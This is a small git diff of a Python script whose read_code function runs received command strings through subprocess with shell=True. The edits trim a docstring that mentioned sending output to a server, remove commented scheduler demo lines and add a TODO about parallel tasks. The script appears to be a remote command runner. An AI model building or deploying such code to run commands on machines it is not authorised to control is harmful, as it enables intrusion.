@@ -12,7 +12,7 @@ event_scheduler = sched.scheduler(time.time, time.sleep)
 
 def read_code(cmd):
     """
-    Receives commands and executes it afterwards sends it to the server.
+    Receives commands and executes it.
     """
     shell = subprocess.Popen(cmd,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
     shell_out,shell_err = shell.communicate()
@@ -35,7 +35,4 @@ while True:
     p.start()
     p.join()
 
-# event_scheduler.enter(10, 1, lambda: print("hello"))
-# event_scheduler.enter(15, 1, lambda: print("world!"))
-# event_scheduler.enterabs(time.time()-19, 1, lambda: print("!!!"))
-# event_scheduler.run()
+#TODO : Resolve running task parrallel
